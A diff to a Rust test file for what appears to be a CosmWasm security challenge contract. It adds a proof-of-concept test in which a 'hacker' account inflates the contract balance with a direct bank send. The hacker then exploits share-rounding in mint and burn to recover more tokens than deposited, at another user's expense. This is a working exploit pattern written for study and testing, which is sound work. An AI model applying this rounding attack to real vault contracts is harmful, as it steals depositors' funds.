@@ -5,8 +5,8 @@ pub mod tests {
         msg::{ExecuteMsg, InstantiateMsg, QueryMsg},
         state::{Balance, Config},
     };
-    use cosmwasm_std::{coin, Addr, CosmosMsg, Empty, Uint128};
-    use cw_multi_test::{App, Contract, ContractWrapper, Executor};
+    use cosmwasm_std::{coin, Addr, BankMsg, CosmosMsg, Empty, Uint128};
+    use cw_multi_test::{App, Bank, Contract, ContractWrapper, Executor};
 
     pub fn challenge_contract() -> Box<dyn Contract<Empty>> {
         let contract = ContractWrapper::new(
@@ -129,21 +129,90 @@ pub mod tests {
     const HACKER: &str = "hacker";
 
     #[test]
-    fn exploit_burn_rounding_skimming() {
+    fn exploit_rounding() {
         // base scenario with 0 funds
         let (mut app, contract_addr) = proper_instantiate();
+        // mint to USER
+        app = mint_tokens(app, USER.to_owned(), Uint128::new(10_000));
+        // mint to HACKER
+        app = mint_tokens(app, HACKER.to_owned(), Uint128::new(1_001));
 
-        let res = Uint128::new(11)
-            .multiply_ratio(Uint128::new(4), Uint128::new(3));
-        assert_eq!(res, Uint128::new(14));
-        let res = Uint128::new(11)
-            .multiply_ratio(Uint128::new(3), Uint128::new(4));
-        assert_eq!(res, Uint128::new(8));
+        // Hacker deposits 1_000
+        app.execute_contract(
+            Addr::unchecked(HACKER),
+            contract_addr.clone(),
+            &ExecuteMsg::Mint {},
+            &[coin(1_000, DENOM)],
+        )
+        .unwrap();
+        // EXPLOIT: Hacker messes with the balance by bank sending 1 token
+        app.execute(
+            Addr::unchecked(HACKER),
+            CosmosMsg::Bank(BankMsg::Send {
+                to_address: contract_addr.to_string(),
+                amount: vec![coin(1, DENOM)],
+            }),
+        )
+        .unwrap();
 
-        // Because of rounding in `mint`,
-        // total assets can exceed total supply  
- 
-        // Because of rounding in `burn` of asset to return,
-        // the minted shares are weird
+        // Query CONFIG
+        let config: Config = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &QueryMsg::GetConfig {})
+            .unwrap();
+        assert_eq!(config.total_supply, Uint128::new(1_000));
+        // Query contract balance
+        let bal = app
+            .wrap()
+            .query_balance(contract_addr.to_string(), DENOM)
+            .unwrap();
+        assert_eq!(bal.amount, Uint128::new(1_001));
+        // total_supply / total_assets < 1 and gets rounded by Uint128
+        // in `multiply_ratio`
+
+        // User DCAs over time
+        for _ in 0..100 {
+            app.execute_contract(
+                Addr::unchecked(USER),
+                contract_addr.clone(),
+                &ExecuteMsg::Mint {},
+                &[coin(100, DENOM)],
+            )
+            .unwrap();
+        }
+
+        // See hacker mint balance
+        let balance: Balance = app
+            .wrap()
+            .query_wasm_smart(
+                contract_addr.clone(),
+                &QueryMsg::UserBalance {
+                    address: HACKER.to_string(),
+                },
+            )
+            .unwrap();
+        assert_eq!(balance.amount, Uint128::new(1_000));
+
+        // Hacker burns shares
+        app.execute_contract(
+            Addr::unchecked(HACKER),
+            contract_addr.clone(),
+            &ExecuteMsg::Burn {
+                shares: balance.amount,
+            },
+            &[],
+        )
+        .unwrap();
+        // Hacker deposited 1_000, bank sent 1,
+        // but got 1_009 back
+        let bal = app.wrap().query_balance(HACKER, DENOM).unwrap();
+        assert_eq!(bal.amount, Uint128::new(1_009));
+
+        // -
+        // DEMO of rounding in Uint128
+        let res = Uint128::new(10).multiply_ratio(Uint128::new(999), Uint128::new(1_000));
+        assert_eq!(res, Uint128::new(9));
+        let res = Uint128::new(10).multiply_ratio(Uint128::new(1_001), Uint128::new(999));
+        assert_eq!(res, Uint128::new(10));
     }
 }
